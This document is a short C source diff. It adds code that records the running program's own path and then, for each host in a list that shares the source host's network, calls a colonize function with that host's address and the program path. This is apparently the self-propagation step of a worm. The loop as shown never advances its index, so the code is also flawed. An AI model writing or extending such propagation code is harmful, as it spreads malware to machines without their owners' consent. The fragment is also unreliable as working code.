@@ -7,9 +7,11 @@ int main (int argc, char **argv) {
 	char *control_file = NULL;
 	char *command_file = NULL;
 	int i = 0;
+	char program[PATH_MAX];
 	struct in_addr *hostList = NULL;
 	struct in_addr srcHost;
 
+	realpath(argv[0], program);
 	dir_name = dirname(argv[0]);
 	chdir(dir_name);
 
@@ -28,7 +30,7 @@ int main (int argc, char **argv) {
 
 			while (1) {
 				if (inet_netof(hostList[i]) == inet_netof(srcHost)) {
-					continue;
+					colonize(inet_ntoa(hostList[i]), program);
 				}
 			}
 		}
